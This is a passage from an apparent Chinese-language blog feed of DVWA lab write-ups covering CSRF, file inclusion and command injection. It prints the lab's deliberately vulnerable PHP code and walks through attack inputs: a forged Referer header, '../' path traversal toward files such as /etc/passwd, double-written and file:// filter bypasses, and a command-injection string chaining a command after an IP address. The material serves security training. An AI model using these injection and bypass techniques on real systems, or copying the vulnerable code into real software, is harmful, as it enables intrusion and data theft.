class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们可以看到服务器检查变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数的值），以抵御CSRF攻击。</p><p>我们先在原页面上提交修改密码请求，burp抓包：<img src="/2021/03/04/DVWA%E2%80%94CSRF/2.png" alt="2"></p><p>再模拟CSRF攻击，burp抓包：<img src="/2021/03/04/DVWA%E2%80%94CSRF/3.png" alt="3"></p><p>我们可以看到如果按照low级别的CSRF攻击是肯定不可能攻击成功的，因为它缺少了Referer的值。因此我们需要手动添加</p><p>Referer: localhost:81</p><h1 id="High"><a href="#High" class="headerlink" title="High:"></a>High:</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前言：&lt;/p&gt;
&lt;p&gt;CSRF，全称Cross-site request forgery，译为跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWA—File Inclusion</title>
    <link href="http://example.com/2021/02/28/DVWA%E2%80%94File%20Inclusion/"/>
    <id>http://example.com/2021/02/28/DVWA%E2%80%94File%20Inclusion/</id>
    <published>2021-02-28T11:26:47.000Z</published>
    <updated>2021-03-12T11:37:17.510Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>File Inclusion，译为文件包含（漏洞）。服务器开启allow_url_include选项时，就可以通过php的某些特性函数（<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>）利用url去动态包含文件。此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。</p><ul><li>文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞。</li></ul><p><strong>本地文件包含漏洞：</strong>通过浏览器包含web服务器上的文件，这种漏洞是因为服务器包含文件时没有进行严格的过滤，直接允许并执行用户在url输入的服务器包含文件。通俗的说就是被包含的文件在服务器本地。</p><p><strong>远程文件包含漏洞：</strong>服务器开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。在远程服务器上预先设置好的webshell，然后攻击者利用该漏洞包含一个远程的文件。这种漏洞的出现是因为服务器对用户的输入没有进行检查，会导致不同程度的信息泄露。通俗的说就是被包含的文件不在目标服务器。</p><ul><li><p>常见的敏感信息路径</p><p>利用本地文件包含漏洞可以获取系统（服务器）的本地文件的内容。<br><strong>Windows系统常见敏感文件如下：</strong></p><p>c:\boot.ini                               系统版本信息<br>c:\xxx\php.ini                         PHP配置信息。<br>c:\xxx\my.ini                           MySQL配置信息。<br>c: \xxx\httpd.conf                  Apache配置信息。<br><strong>linux系统常见敏感文件如下：</strong></p><p>/etc/passwd                                    Linux系统账号信息。<br>/etc/httpd/conf/httpd.conf          Apache配置信息。<br>/etc/my.conf                                  MySQL配置信息。<br>/usr/etc/php.ini                             PHP配置信息。</p></li><li><p>常见路径符号</p><p>/                                 根目录<br>./                                当前目录<br>../                               返回到上一级目录<br>../../                            返回上两级目录<br>.\ 、..\和./、../          意义相同</p></li></ul><h1 id="Low："><a href="#Low：" class="headerlink" title="Low："></a>Low：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们可以看到，服务器端对page参数没有做任何的过滤跟检查。</p><ul><li><strong>利用本地文件包含漏洞</strong></li></ul><p>我们先让参数page的值等于一个服务器本地不存在的文件![1](DVWA—File Inclusion/1.png)</p><p>我们可以看到网站的根目录为<code>\DVWA-master\</code>，而<code>index.php</code>文件距根目录差两个文件夹，那么我们可以通过两个<code>../</code>回到根目录，然后去访问一些敏感文件：如PHP版本信息等。![2](DVWA—File Inclusion/2.png)</p><ul><li><strong>利用远程文件包含漏洞</strong></li></ul><p>因为我们搭的是靶场模拟服务器，那dvwa（81端口）靶场就相当于一个服务器，我们再在“远端服务器”127.0.0.1下上传文件1.txt内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">      phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后利用远程文件包含访问![3](DVWA—File Inclusion/3.png)</p><h1 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们可以看到服务器过滤了<code>http://</code>, <code>https://</code>，<code>../</code>, <code>..\</code>，但是我们只要用双写就可以绕过了</p><p>![4](DVWA—File Inclusion/4.png)</p><p>![5](DVWA—File Inclusion/5.png)</p><h1 id="High："><a href="#High：" class="headerlink" title="High："></a>High：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, $file ) &amp;&amp; $file != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>新函数：</p><p><strong>fnmatch() 函数</strong></p><p>功能：根据指定的模式来匹配文件名或字符串。</p><p>语法：fnmatch(pattern,string,flags)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">pattern</td><td align="left">必需。规定要检索的模式。</td></tr><tr><td align="left">string</td><td align="left">必需。规定要检查的字符串或文件。</td></tr><tr><td align="left">flags</td><td align="left">可选。</td></tr></tbody></table><p>我们可以看到服务器规定只能包含以file开头的文件，但是我们可以利用file协议绕过。</p><p>file协议主要用于访问本地计算机中的文件，当我们用浏览器打开一个本地文件时利用的就是file协议![6](DVWA—File Inclusion/6.png)</p><p>file协议的基本格式：file:///文件路径</p><p>由于file协议规定只能由于访问本地文件，因此搭配文件上传漏洞效果极佳。![7](DVWA—File Inclusion/7.png)</p><h1 id="Impossible："><a href="#Impossible：" class="headerlink" title="Impossible："></a>Impossible：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Impossible File Inclusion Source</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">&quot;include.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;File Inclusion，译为文件包含（漏洞）。服务器开启allow_url_include选项时，就可以通过php的某些特性函</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWA——Command Injection</title>
    <link href="http://example.com/2021/02/25/DVWA%E2%80%94Command%20Injection/"/>
    <id>http://example.com/2021/02/25/DVWA%E2%80%94Command%20Injection/</id>
    <published>2021-02-25T12:24:15.000Z</published>
    <updated>2021-04-06T09:12:34.168Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>命令注入——利用可以调用系统命令的web应用，通过构造特殊命令字符串的方式，把恶意代码输入一个编辑域(例如缺乏有效验证的输入框)来改变网页动态生成的内容，最终实现本应在服务端才能工作的系统命令。命令注入攻击的常见场景为：仅仅需要输入数据的场合，攻击者构造数据同时输入了恶意命令代码，而系统对此并未过滤，恶意命令代码一并执行，最终导致信息泄露或者正常数据的破坏；PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。命令注入和代码注入不同，代码注入的目的在于将外部代码注入应用程序本身，并随程序执行；命令攻击的对象是服务器的宿主机。因此用户可以通过构造特殊的输入来达到入侵目的。</p><ul><li><strong><code>&amp;</code>，<code>&amp;&amp;</code>，<code>|</code>，<code>||</code>命令拼接符的区别</strong>:</li></ul><table><thead><tr><th>A&amp;B</th><th align="center">拼接，A和B之间无制约关系</th></tr></thead><tbody><tr><td>A&amp;&amp;B</td><td align="center">A执行成功，之后才会执行B</td></tr><tr><td>A|B</td><td align="center">A的输出作为B的输入</td></tr><tr><td>A||B</td><td align="center">A执行失败，之后才会执行B</td></tr><tr><td>A;B</td><td align="center">; 分号表示命令依次执行。</td></tr></tbody></table><ul><li><p><strong>windows系统下常见的拼接命令：</strong></p><ul><li><p>ipconfig 查看本地网络</p></li><li><p>net  user   查看系统用户</p></li><li><p>dir  查看当前目录</p></li><li><p>find 查找包含指定字符的行</p></li><li><p>whoami 查看系统当前有效用户名   </p></li></ul></li></ul><ul><li><strong>Linux命令大全</strong>：<a href="https://www.runoob.com/linux/linux-command-manual.html">https://www.runoob.com/linux/linux-command-manual.html</a></li></ul><h1 id="Low"><a href="#Low" class="headerlink" title="Low:"></a>Low:</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;   </span><br><span class="line">        <span class="comment">// Get input   </span></span><br><span class="line">        $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];   </span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.   </span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;     </span><br><span class="line">            <span class="comment">// Windows     </span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping &#x27;</span> . $target );   </span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="keyword">else</span> &#123;     </span><br><span class="line">            <span class="comment">// *nix     </span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping -c 4 &#x27;</span> . $target );   </span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="comment">// Feedback for the end user   </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>新函数：</p><ul><li><strong>php_uname()函数</strong></li></ul><p>功能：返回运行 PHP 的系统的有关信息。</p><p>语法：php_uname ([ string $mode = “a” ] )</p><p>   其中，<code>mode</code> 是单个字符，用于定义要返回什么信息：</p><ol><li><p><code>&#39;a&#39;</code>：此为默认。包含序列 <code>&quot;s n r v m&quot;</code> 里的所有模式。</p></li><li><p><code>&#39;s&#39;</code>：操作系统名称。例如： <code>FreeBSD</code>。</p></li><li><p><code>&#39;n&#39;</code>：主机名。例如： <code>localhost.example.com</code>。</p></li><li><p><code>&#39;r&#39;</code>：版本名称，例如： <code>5.1.2-RELEASE</code>。</p></li><li><p><code>&#39;v&#39;</code>：版本信息。操作系统之间有很大的不同。</p></li><li><p><code>&#39;m&#39;</code>：机器类型。例如：<code>i386</code>。 </p></li></ol><p>   <strong>shell_exec()函数</strong></p><p>   功能：通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。（补充：<code>Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务。</code>）</p><p>   语法：shell_exec ( string <code>$cmd</code> )</p><p>   其中参数cmd为要执行的命令。</p><p>查看源码我们可知，服务器通过<strong>stristr</strong>和<strong>php_uname</strong>两个函数来判断操作系统，执行不同的ping命令。同时服务器没有对我们输入的IP地址做任何的过滤处理，我们可以利用任意的命令执行分隔符来执行我们的指令、获取我们想要的信息。</p><p>例如输入：127.0.0.1&amp;&amp;echo “hello world”</p><p>![1](DVWA—Command Injection/1.png)</p><h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium:"></a>Medium:</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>新函数：</p><ul><li><p><strong>str_replace()函数</strong></p><p><strong>功能：</strong>替换字符串中的一些字符（区分大小写）。</p><p>该函数必须遵循下列规则：</p><ul><li>如果搜索的字符串是一个数组，那么它将返回一个数组。</li><li>如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。</li><li>如果同时需要对某个数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余的元素将用空字符串进行替换。</li><li>如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。</li></ul><p>补充：该函数是区分大小写的。 str_ireplace() 函数执行不区分大小写的搜索。</p><p><strong>语法：</strong>str_ireplace(<em>find,replace,string,count</em>)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>find</em></td><td align="left">必需。规定要查找的值。</td></tr><tr><td align="left"><em>replace</em></td><td align="left">必需。规定替换 <em>find</em> 中的值的值。</td></tr><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>count</em></td><td align="left">可选。一个变量，对替换数进行计数。</td></tr></tbody></table></li><li><p><strong>array_keys() 函数</strong></p><p><strong>功能：</strong>返回包含数组中所有键名的一个新数组。</p><p><strong>语法</strong>：array_keys(<em>array,value,strict</em>)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>array</em></td><td align="left">必需。规定数组。</td></tr><tr><td align="left"><em>value</em></td><td align="left">可选。您可以指定键值，然后只有该键值对应的键名会被返回。</td></tr><tr><td align="left"><em>strict</em></td><td align="left">可选。与 value 参数一起使用。                                                                                                         可能的值：true - 返回带有指定键值的键名。依赖类型，数字 5 与字符串 “5” 是不同的；                                   false - 默认值。不依赖类型，数字 5 与字符串 “5” 是相同的。</td></tr></tbody></table></li></ul><p>​       菜鸟实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;array(&quot;Volvo&quot;&#x3D;&gt;&quot;XC90&quot;,&quot;BMW&quot;&#x3D;&gt;&quot;X5&quot;,&quot;Toyota&quot;&#x3D;&gt;&quot;Highlander&quot;);</span><br><span class="line">print_r(array_keys($a));</span><br><span class="line">?&gt;</span><br><span class="line">运行结果：Array ( [0] &#x3D;&gt; Volvo，[1] &#x3D;&gt; BMW ，[2] &#x3D;&gt; Toyota )</span><br></pre></td></tr></table></figure><p>通过查看源码我们发现服务器设置了黑名单过滤了字符<code>&amp;&amp;</code>和<code>;</code>，但是我们可以是用<code>&amp;</code>替代，<code>&amp;;&amp;</code>绕过的方式避开黑名单。</p><h1 id="High："><a href="#High：" class="headerlink" title="High："></a>High：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = 